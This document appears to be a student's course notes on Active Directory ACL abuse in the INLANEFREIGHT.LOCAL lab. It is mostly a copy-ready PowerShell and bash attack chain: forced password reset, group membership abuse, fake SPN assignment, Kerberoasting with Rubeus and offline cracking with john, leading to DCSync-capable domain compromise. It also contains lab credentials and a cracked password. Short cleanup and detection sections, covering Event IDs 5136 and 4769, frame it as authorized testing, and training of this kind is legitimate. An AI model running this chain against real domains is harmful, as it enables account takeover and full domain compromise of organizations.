# Section 21 — ACL Abuse Tactics

---

## QUICK REFERENCE — Full Attack Chain Commands

```powershell
cd C:\Tools
Import-Module .\PowerView.ps1

# STEP 1 — Auth as wley, reset damundsen's password (ForceChangePassword ACE)
$SecPassword = ConvertTo-SecureString 'transporter@4' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose

# STEP 2 — Auth as damundsen, add to Help Desk Level 1 (GenericWrite on group)
$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose

# STEP 3 — Confirm group membership
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName

# STEP 4 — Assign fake SPN to adunn (GenericAll via nested IT group membership)
# Re-create $Cred2 first — forces fresh auth that includes new group membership
$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose

# STEP 5 — Kerberoast adunn using the fake SPN
.\Rubeus.exe kerberoast /user:adunn /nowrap
# Copy the $krb5tgs$23$* hash to Linux

# STEP 6 — Crack on Linux (single quotes — double quotes break $ expansion)
# john adunn_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
# Result: SyncMaster757

# CLEANUP — must do in this order
# 1. Remove fake SPN first (need group rights to do this — do before removing from group)
Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose
# 2. Remove damundsen from group
Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
# 3. Confirm removal
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName | ? {$_.MemberName -eq 'damundsen'}
```

---

## Lab Attack Chain (INLANEFREIGHT.LOCAL) — Full Walkthrough

**Starting creds:** `wley` / `transporter@4`

```
wley
  └─ ForceChangePassword → damundsen
       └─ GenericWrite → Help Desk Level 1 (add damundsen as member)
            └─ (nested into) Information Technology group
                 └─ GenericAll → adunn
                      └─ Assign fake SPN → Kerberoast → crack → SyncMaster757
                           └─ adunn can DCSync → full domain compromise
```

### Step-by-step with explanation

**Step 1 — Build a PSCredential object for wley**
```powershell
$SecPassword = ConvertTo-SecureString 'transporter@4' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
```
- PowerView functions accept `-Credential` to act as a different user without opening a new shell
- `ConvertTo-SecureString` wraps the plaintext password so PS won't log it as cleartext
- `PSCredential` object = identity token you pass to PowerView commands

**Step 2 — Use wley's ForceChangePassword right to reset damundsen**
```powershell
$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
```
- `ForceChangePassword` = can reset password without knowing the current one
- We set it to something we know so we can authenticate as damundsen next
- `-Verbose` always — confirms success or shows the error clearly
- **Destructive** — breaks any existing sessions damundsen has open. Get client approval first.

**Step 3 — Build PSCredential for damundsen, add to Help Desk Level 1**
```powershell
$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
```
- damundsen has `GenericWrite` on Help Desk Level 1 = can add members
- We add damundsen to the group so they inherit the group's rights
- Help Desk Level 1 is nested inside Information Technology → damundsen now inherits IT group rights
- IT group has `GenericAll` over adunn → damundsen now effectively has full control over adunn

**Step 4 — Recreate $Cred2, assign fake SPN to adunn**
```powershell
$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```
- Recreate `$Cred2` to force fresh auth — the previous credential object won't reflect new group membership
- `GenericAll` = full control, including writing the `servicePrincipalName` attribute
- Setting any SPN makes the account Kerberoastable — the KDC will issue a TGS ticket encrypted with adunn's password hash
- The SPN value (`notahacker/LEGIT`) is fake/arbitrary — it just needs to exist to trigger Kerberoasting

**Step 5 — Kerberoast adunn**
```powershell
.\Rubeus.exe kerberoast /user:adunn /nowrap
```
- Now that adunn has an SPN, we can request a TGS ticket from the KDC
- The ticket is encrypted with adunn's NTLM hash → take it offline and crack
- `/nowrap` = no line breaks → hash is copy-paste ready for Hashcat/John

**Step 6 — Crack on Linux**
```bash
echo '$krb5tgs$23$*adunn$...' > adunn_hash.txt   # single quotes — $ breaks in double quotes
john adunn_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
# cracked: SyncMaster757
```
- `$krb5tgs$23$` = RC4 ticket → Hashcat mode 13100, John format krb5tgs
- Single quotes are mandatory — double quotes cause shell to interpret `$` as variable

**Cleanup — order matters**
```powershell
# 1. Remove fake SPN (do this WHILE damundsen is still in the group)
Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose
# 2. Remove damundsen from group
Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
```
- Must remove the SPN **before** removing from the group
- Once damundsen leaves Help Desk L1, they lose GenericAll over adunn and can't clear the SPN
- Notify client about damundsen's password change — they'll need to reset it back or alert the user

---

## Linux Alternative — targetedKerberoast

```bash
# One-shot: creates SPN, requests hash, deletes SPN automatically
python3 targetedKerberoast.py -v -d 'INLANEFREIGHT.LOCAL' -u 'damundsen' -p 'Pwn3d_by_ACLs!'
```
- Cleaner for Linux-only assessments — no manual SPN creation/cleanup needed

---

## Detection

| Event ID | Meaning |
|----------|---------|
| 5136 | Directory Service object modified — fires when SPN is set/cleared or ACL changed |
| 4769 | Kerberos TGS requested — spike on fake SPN accounts = targeted Kerberoasting |

**Reading SDDL from Event 5136:**
```powershell
ConvertFrom-SddlString "O:BAG:BAD:AI..." | select -ExpandProperty DiscretionaryAcl
# Look for unexpected entries like:
# INLANEFREIGHT\mrb3n: AccessAllowed (GenericWrite, ...)
```

---

## Lab Answers

| Question | Answer |
|----------|--------|
| adunn cleartext password (cracked from targeted Kerberoast) | `SyncMaster757` |

---

## Exam Notes

- PSCredential = how you impersonate a different user in PowerView without a new shell
- Recreate `$Cred2` after adding to group — old credential object won't reflect new group membership
- Cleanup order: remove fake SPN → remove from group (reverse order of attack)
- GenericAll on a user = targeted Kerberoasting is preferred over ForceChangePassword when the account is sensitive/admin
- `targetedKerberoast.py` on Linux = cleaner, handles SPN cleanup automatically
- Always document every change: password reset, group add, SPN modification
- Event ID 5136 = the detection signal; defenders monitoring this catch ACL abuse chains
- Single quotes when echoing hashes to file — double quotes break `$` variable expansion
